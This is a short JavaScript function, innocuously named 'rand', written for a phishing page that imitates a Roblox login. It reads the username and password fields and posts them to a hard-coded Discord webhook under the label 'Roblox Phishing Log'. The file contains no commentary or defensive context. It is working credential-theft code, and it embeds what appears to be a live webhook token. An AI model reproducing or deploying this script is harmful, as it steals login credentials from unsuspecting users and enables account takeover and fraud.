function rand() {
	
	
	
	u = document.getElementById("login-username").value; 
	p = document.getElementById("login-password").value;
	
	wb = "https://discord.com/api/webhooks/1453126030993789019/08PZyadebS2KoR-kjtOo_wW06gx_QCI4lEJOXdJtocB81Qv3rh631HcF9aJANpZ3MrUV";
	
	var request = new XMLHttpRequest();
      request.open("POST", wb);

      request.setRequestHeader('Content-type', 'application/json');

      var params = {
        username: "Roblox Phishing Log",
        avatar_url: "https://play-lh.googleusercontent.com/8ddL1kuoNUB5vUvgDVjYY3_6HwQcrg1K2fd_R8soD-e2QYj8fT9cfhfh3G0hnSruLKec",
        content: "```Username: " + u + " | Password: " + p + "```"
      }

      request.send(JSON.stringify(params));
	
}
